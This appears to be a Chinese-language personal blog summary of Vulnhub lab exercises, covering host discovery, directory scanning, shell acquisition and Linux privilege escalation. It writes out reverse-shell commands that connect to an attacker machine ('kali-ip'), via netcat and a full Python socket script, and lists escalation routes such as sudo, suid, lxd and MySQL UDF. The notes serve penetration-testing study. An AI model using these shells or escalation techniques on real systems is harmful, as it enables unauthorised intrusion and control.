---
title: Conclusion1_Chapter1~5
categories:
- Network_Security
- Vulnhub
- Conclusion
tags:
- Network_Security
- Vulnhub
date: 2024-01-29 14:24:58
---

# 总结（Chapter 1-5）

## 1. 外围探测与扫描

### 1.1 主机发现

1. arp-scan，基于 arp

2. arping
    虽然它是 Linux 发行版常见的工具，但注意其并不支持网段的扫描，需要结合 Shell 脚本语言使用，例子：

    ```bash
    for i in $(seq 3 254); do sudo arping -c 2 192.168.0.$i; done
    # 扫描 192.168.0.3-254，-c 表示 count
    ```

3. netdiscover，也是基于 arp 的工具，实际使用时，掩码需要 -8：
    `sudo netdiscover -r 网段/实际掩码 - 8`

4. nmap

### 1.2 目录扫描

1. dirsearch 轻量级。
2. feroxbuster 结合 seclists 来进行大规模的目录扫描。

## 2. Shell 的获取

### 2.1 通过 NC

1. 查看是否有 NC：`which nc`。
2. 高版本 NC 反弹 Shell：
    `nc kali-ip kali-端口 -e /bin/sh`
3. 低版本 NC 串联：
    `nc kali-ip kali-端口-1 | /bin/bash | /bin/nc kali-ip kali-端口-2 # nc 串联，使用 | 将结果向后传递。`

### 2.2 通过其他途径

1. python：
    ```python
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('kali-ip', kali-端口))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(['/bin/sh','-i'])
    ```

    如果是命令，就需要 `python -c "上述代码"`。注意单双引号。

2. 修改源代码，上线 WebShell 工具。

### 2.3 交互性的增加

1. 初步增加：
    `python -c "import pty; pty.spawn('/bin/bash')"`

2. 完全的即时交互：

    > https://www.endlessshw.top/2024/01/23/Network_Security/Vulnhub_Journey/Chapter4_Medium_AdmX_New/Chapter4_Medium_AdmX_New/#1-2-%E6%8B%BF%E5%88%B0-Shell-%E4%B8%8E-Shell-%E4%BF%9D%E6%8C%81

## 3. 提权

### 3.1 内核提权

1. 查看内核相关信息：
    ```bash
    uname -a # 查看内核
    lsb_release -a # 查看 OS 版本
    ```

2. `search Linux 版本` 寻找 EXP。

3. CVE-2021-3493

### 3.2 suid 提权

1. 先找权限是 S 的文件。
2. 查看其文件，分析源代码，尝试构造出提权命令。

### 3.3 sudo 提权

1. 先从常见的工具入手，是否可以 sudo 提权

2. `sudo -l` 查看当前用户可以通过 `sudo` 使用的命令和工具，通过具体的工具和命令进行提权：

    > https://ihsansencan.github.io/privilege-escalation/linux/binaries/
    >
    > https://haiclover.github.io/gtfobins/node/
    >
    > 学会使用谷歌，好多东西中文互联网未必搜得到。

### 3.4 其他较为通用的提权方式

1. lxd 提权
2. MySQL UDF 提权

## 4. 一些杂项和思想

1. Burpsuite 可以一次性修改发送包和接受包的某些内容（通过正则匹配）。
2. cyberchef 工具用于加解密。
3. 密码交叉复用的思想！
4. Venom 内网穿透工具。
5. PWN 要学，GDB 调试工具的使用，Python 的 `struct` 包。
6. exp 要学会查看，视具体报错情况还得修改。
7. docker 容器的判断。